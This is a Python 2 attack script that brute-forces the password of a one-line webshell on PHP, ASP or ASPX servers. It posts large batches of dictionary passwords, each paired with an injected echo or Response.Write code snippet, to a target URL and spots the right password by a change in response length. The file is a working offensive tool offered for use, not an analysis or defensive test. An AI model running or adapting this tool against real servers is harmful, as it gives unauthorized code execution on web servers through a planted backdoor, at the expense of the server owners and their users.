#coding:utf-8
#Author:LSA
#Description:brute a word shell
#Date:20180112
#version:1.0



import requests
import optparse
import sys


headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'}


def main():
	
	parser = optparse.OptionParser('python %prog '+\
                 '-h <manual>',version="%prog v1.0")
	
        parser.add_option('-u', dest='shellSite', type='string',\
                 help='input target webshell url')
        parser.add_option('-f', dest='dicSite', type='string', default='aWordShellPwd.txt', help='input dic path(./aWordShellPwd.txt default)')
	
	parser.add_option('-v', dest='verbose', action='store_true',\
                 help='show verbose message')

        (options, args) = parser.parse_args()
         
        shellSite = options.shellSite
        dicSite = options.dicSite
	verbose = options.verbose

	shellpwd = {}
	
	dic = open(dicSite,'r')
	pwd = dic.readlines()

	if shellSite.split('.')[-1] == "php":
		mserver = "apache"
		pwdGroup = len(pwd) / 1000   #password groups
		g = 1000
	else:
		mserver = "iis"
		pwdGroup = len(pwd) / 3500   #500 error if 3700
		g = 3500

	print 'Total password nums is ' + str(len(pwd))
	print 'Cut ' + str(pwdGroup) + ' groups'

	formatPwd = []
	for p in range(0,len(pwd)):
		password = str(pwd[p]).strip('\r\n')
		formatPwd.append(password)
	
	if mserver == "apache":
		postWrong = {'wrongpassword': 'echo "wrongpassword";'}
		type = 1
	elif mserver == "iis" and shellSite.split('.')[-1] == "asp":
		postWrong = {'wrongpassword': 'response.write("wrongpassword")'}
		type = 2
	elif mserver == 'iis' and shellSite.split('.')[-1] == 'aspx':
		postWrong = {'wrongpassword': 'Response.Write("wrongpassword")'}
		type = 3

	rsp = requests.post(shellSite,data=postWrong,headers=headers)
	wrongres = rsp.text   #wrong password flag
	#print len(rsp.text)
	postWrong.clear()

	for i in range(0,pwdGroup):
		groups = []
		for j in range(i*g,(i+1)*g):   #every group password
			groups.append(formatPwd[j])
		for k in groups:
			if type == 1:
				shellpwd[k] = 'echo "Password is %s";' % k
			if type == 2:
				shellpwd[k] = 'response.write("Password is %s")' % k
			if type == 3:
				shellpwd[k] = 'Response.Write("Password is %s")' % k

		rsp1 = requests.post(shellSite,data=shellpwd,headers=headers)
		
		if verbose:
			print 'Bruting ' + 'group ' + str(i+1)	
		#print shellpwd
		
		shellpwd.clear()
		if len(rsp1.text) != len(wrongres):
			print rsp1.text + '!!!!!!!!!!!!!'
			exit(0)


	otherGroup = []
	for others in range(pwdGroup*g,len(pwd)):   #else password
		otherGroup.append(formatPwd[others])
		
	for w in otherGroup:
		#print w
		if type == 1:
			shellpwd[w] = 'echo "Password is %s";' % w
		if type == 2:
			shellpwd[w] = 'response.write("Password is %s")' % w
		if type == 3:
			shellpwd[w] = 'Response.Write("Password is %s")' % w
	#print shellpwd
	if verbose:
		print 'Bruting others......'
	
	rsp2 = requests.post(shellSite,data=shellpwd,headers=headers)
	
	if len(rsp2.text) != len(wrongres):
		print '**********************************'
		print rsp2.text
		print '**********************************'
		exit(0)



if __name__ == '__main__':
	print '''
                 ________              _____             
______ ___      ____  __ )__________  ___  /_____________
_  __ `/_ | /| / /_  __  |_  ___/  / / /  __/  _ \_  ___/
/ /_/ /__ |/ |/ /_  /_/ /_  /   / /_/ // /_ /  __/  /    
\__,_/ ____/|__/ /_____/ /_/    \__,_/ \__/ \___//_/     
    
					      By LSA
	'''
	main()

	
	


